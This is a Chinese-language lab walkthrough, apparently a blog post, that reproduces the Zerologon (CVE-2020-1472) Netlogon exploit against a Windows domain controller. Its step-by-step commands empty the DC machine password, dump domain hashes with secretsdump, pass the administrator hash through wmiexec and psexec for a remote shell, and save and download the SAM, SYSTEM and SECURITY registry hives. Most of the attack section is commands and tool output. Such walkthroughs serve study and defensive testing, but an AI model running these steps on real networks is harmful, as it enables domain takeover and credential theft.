## 一：漏洞详情

原理：Netlogon使用的AES认证算法中的vi向量默认为0，导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，导致可以将域控中保存在AD中的管理员password设置为空。

简单来说：就是攻击者可以利用这个漏洞将域控密码设置为空。从而导出hash，掌握域控。

### 影响范围

Windows Server 2008 R2 for x64-based Systems Service Pack 1  
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
installation)  
Windows Server 2012  
Windows Server 2012 (Server Core installation)  
Windows Server 2012 R2  
Windows Server 2012 R2 (Server Core installation)  
Windows Server 2016  
Windows Server 2016 (Server Core installation)  
Windows Server 2019  
Windows Server 2019 (Server Core installation)  
Windows Server, version 1903 (Server Core installation)  
Windows Server, version 1909 (Server Core installation)  
Windows Server, version 2004 (Server Core installation)

## 二：漏洞复现

实验环境

![1656226029_62b800ed13596fd2ff36e.png!small](https://image.3001.net/images/20220626/1656226029_62b800ed13596fd2ff36e.png!small)

步骤一：检查三台机器是否能够进行性正常通信...

![1656226307_62b80203c2524c440a3fe.png!small](https://image.3001.net/images/20220626/1656226307_62b80203c2524c440a3fe.png!small)

步骤二：下载以下项目到Kali机器上并做安装...

项目地址  
https://github.com/SecureAuthCorp/impacket.git  
安装命令  
python3 setup.py install

`Impacket`是一个Python类库，用于对SMB1-3或IPv4 / IPv6
上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问...

步骤三：下载以下项目进行漏洞检测..出现如下便存在漏洞...

项目地址：  
https://github.com/SecuraBV/CVE-2020-1472  
使用方法：

    
    
    python3 zerologon_tester.py 域控主机名 域控IP
    python3 zerologon_tester.py dc 192.168.4.2

![1656226382_62b8024e4b0c283118eca.png!small](https://image.3001.net/images/20220626/1656226382_62b8024e4b0c283118eca.png!small)

步骤四：也可以使用Mimikatz进行漏洞检测...

    
    
    mimikatz.exe "lsadump::zerologon /target:域控ip /account:域控主机名"
    mimikatz.exe "lsadump::zerologon /target:192.168.4.2 /account:dc"

步骤四：下载并执行攻击脚本对域控机器密码替换为空....

项目地址：  
https://github.com/dirkjanm/CVE-2020-1472  
使用方法：

    
    
    python3 cve-2020-1472-exploit.py 域控主机名 域控IP
    python3 cve-2020-1472-exploit.py dc 192.168.4.2

![1656226448_62b80290c78e5ae7e9332.png!small](https://image.3001.net/images/20220626/1656226448_62b80290c78e5ae7e9332.png!small)

步骤五：进入在第一步下载的`impacket`文件夹并进入`examples`打开命令行终端...使用以下语句来DUMP域控山的Hash值....发现机器账户的密码置为空且`31d6c...`为空密码开头....

    
    
    python3 secretsdump.py 域名称/域控主机名\$@域控IP -no-pass
    python3 secretsdump.py 4pts/dc\$@192.168.4.2 -no-pass

![1656226472_62b802a81f467550d378a.png!small](https://image.3001.net/images/20220626/1656226472_62b802a81f467550d378a.png!small)

步骤六：可以利用获取到的管理员HASH通过DOS命令远程控制域控服务器...使用以下命令进入到域控CMD...

方法一：

    
    
    python3 wmiexec.py -hashes hash值 域名称/域控用户名@域控ip
    python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:4ed9fa78b52edf56286dc7fac36d5742 administrator@192.168.4.2

方法二：

    
    
    psexec.py test.com/administrator@192.168.223.133  -hashes :获取的administrator中hash值
    python3 psexec.py 4pts.com/administrator@192.168.4.2 -hashes aad3b435b51404eeaad3b435b51404ee:4ed9fa78b52edf56286dc7fac36d5742

![1656226506_62b802ca547e0c6002f8d.png!small](https://image.3001.net/images/20220626/1656226506_62b802ca547e0c6002f8d.png!small)

![1656226538_62b802eaaf202a9c5d2c8.png!small](https://image.3001.net/images/20220626/1656226538_62b802eaaf202a9c5d2c8.png!small)

步骤7：执行以下命令导出原`sam.save`、`system.save`、`security.save`文件本地导出hash用于恢复域控密码！

目标机器hash长时间为空密码会导致脱域，对域环境产生重大影响，所以在拿到权限后需尽快恢复hash!

    
    
    #摘要命令
    heLp
    reg save HKLM\SYSTEM system.save
    reg save HKLM\SAM sam.save
    reg save HKLM\SECURITY security.save
    lget system.save
    lget sam.save
    lget security.save
    del /f system.save
    del /f sam.save
    del /f security.save
    exit
    
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    
    [*] SMBv2.1 dialect used
    [!] Launching semi-interactive shell - Careful what you execute
    [!] Press help for extra shell commands
    C:\>help
    
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
    lget {file}                 - downloads pathname to the current local dir
    ! {cmd}                    - executes a local shell cmd
    
    C:\>reg save HKLM\SYSTEM system.save
    [-] Decoding error detected, consider running chcp.com at the target,
    map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
    and then execute wmiexec.py again with -codec and the corresponding codec
    �����ɹ���ɡ�
    
    C:\>reg save HKLM\SAM sam.save
    [-] Decoding error detected, consider running chcp.com at the target,
    map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
    and then execute wmiexec.py again with -codec and the corresponding codec
    �����ɹ���ɡ�
    
    C:\>reg save HKLM\SECURITY security.save
    [-] Decoding error detected, consider running chcp.com at the target,
    map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
    and then execute wmiexec.py again with -codec and the corresponding codec
    �����ɹ���ɡ�
    
    C:\>lget system.save
    [*] Downloading C:\\system.save
    C:\>lget sam.save
    [*] Downloading C:\\sam.save
    C:\>lget security.save
    [*] Downloading C:\\security.save
    C:\>del /f system.save
    C:\>del /f sam.save
    C:\>del /f security.save
    C:\>exit

步骤8：下载完成后可在当前脚本目录下发现是下载的文件...

ls -la | grep save

![1656226594_62b80322a97c6529943d3.png!small](https://image.3001.net/images/20220626/1656226594_62b80322a97c6529943d3.png!small)

步骤九：使用`secretsdump.py`对导出下载的`sam.save`、`system.save`、`security.save`文件进行解密，用于后续密码恢复....

python3 secretsdump.py -sam sam.save -system system.save -security
security.save LOCAL

![1656226619_62b8033b158e606f0bdf4.png!small](https://image.3001.net/images/20220626/1656226619_62b8033b158e606f0bdf4.png!small)

步骤10：通过导出的原NTLMhash恢复域控密码，使用以下GITHUB项目执行操作...

项目地址：  
https://github.com/risksense/zerologon  
使用方法：

    
    
    python reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR <ORI_HASH>
    python3 reinstall_original_pw.py dc 192.168.4.2 d631ab5631506b3f138451d85303ff5b

![1656226642_62b80352582e05c737195.png!small](https://image.3001.net/images/20220626/1656226642_62b80352582e05c737195.png!small)

步骤11：再次使用空密码尝试远程导出域控的`ntlmhash`，检测密码是否恢复成功，此时已经不能获取到HASH..

    
    
    python3 secretsdump.py 4pts/dc\$@192.168.4.2 -no-pass

![1656226670_62b8036e7bf2387073b48.png!small](https://image.3001.net/images/20220626/1656226670_62b8036e7bf2387073b48.png!small)

  

